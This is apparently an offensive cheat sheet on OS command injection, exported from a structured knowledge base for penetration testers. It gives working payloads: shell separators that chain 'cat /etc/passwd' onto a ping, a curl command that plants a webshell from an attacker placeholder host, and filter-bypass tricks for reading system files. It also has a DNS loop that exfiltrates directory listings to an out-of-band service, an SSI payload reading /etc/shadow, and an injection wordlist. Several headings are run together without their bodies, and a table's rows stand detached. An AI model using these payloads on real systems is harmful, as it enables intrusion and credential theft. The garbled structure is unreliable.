entries.title: What it is and where to look
entries.body:
Command injection (shell injection) is the execution of arbitrary OS commands when an application passes unsafe user input to a system shell.
• Input comes from forms, cookies, HTTP headers, any parameters.
• Look where the application invokes external utilities: ping/nslookup/whois, converters (imagemagick, ffmpeg), archivers, PDF export.
• First try command separators (; && || | &), then `cmd` / $(cmd) substitution.
• The vulnerability is dangerous: it leads to full compromise of the host.

entries.title: Example of exploiting the vulnerable ping
entries.body:
Input: 8.8.8.8; cat /etc/passwd
Result: ping -c 4 8.8.8.8; cat /etc/passwd
First 8.8.8.8 is pinged, then cat /etc/passwd is executed.

rows: Execute the second command only if the first succeeds (return code 0)
Execute the second command only if the first failed with an error
Run the command in the background
Pipe the output of the first command into the input of the second (pipe)

entries.title: Command chaining - syntax
entries.body:
command1; command2   # Execute command1 and then command2
command1 && command2 # Execute command2 only if command1 succeeds
command1 || command2 # Execute command2 only if command1 fails
command1 & command2  # Execute command1 in the background
command1 | command2  # Pipe the output of command1 into command2

entries.title: Dropping a webshell via curl -o
entries.body:
# -o, --output <file>        Write to file instead of stdout
curl http://[ATTACKER.DOMAIN.TLD]/ -o webshell.php

entries.title: WorstFit - fullwidth quotes (Windows ANSI)
$IFS - Internal Field Separator instead of a space
Brace expansion instead of a space
Input redirection (<) instead of a space
No slash - via ${HOME:0:1} and tr
entries.body:
echo ${HOME:0:1}
# => /
cat ${HOME:0:1}etc${HOME:0:1}passwd
echo . | tr '!-0' '"-1'
# => /
tr '!-0' '"-1' <<< .
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd

entries.title: Splitting the command name with quotes/backticks/slash
entries.body:
w'h'o'am'i
wh''oami
'w'hoami
w"h"o"am"i
wh""oami
"wh"oami
wh``oami
w\ho\am\i
/\b\i\n/////s\h

entries.title: Variable substitution and wildcards for paths
Time-based - character by character via delay
entries.body:
# Correct value: we wait 5 seconds
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
# real    0m5.007s

# Incorrect value: no delay
time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
# real    0m0.002s

entries.title: DNS-based - output via DNS queries
entries.body: for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done

entries.title: OOB services for verifying exfiltration
entries.body:
Services for receiving out-of-band interactions (DNS/HTTP):
• dnsbin.zhack.ca
• app.interactsh.com (projectdiscovery/interactsh)
• Burp Collaborator (portswigger.net)

entries.title: nohup - survive the parent process timeout
-- ends the option list
entries.body: In Unix-like CLIs the -- symbol marks the end of options. After --, all arguments are treated as file names/arguments rather than options. Useful for cutting off arguments after the injection point.

entries.title: Wordlist for Intruder - separators (Unix)
entries.body:

<!--#exec%20cmd="/bin/cat%20/etc/shadow"-->

a);id

entries.title: Tools for automated exploitation
entries.body:
• commixproject/commix - automatic discovery and exploitation of OS command injection.
• projectdiscovery/interactsh - server/client for collecting OOB interactions (DNS/HTTP).
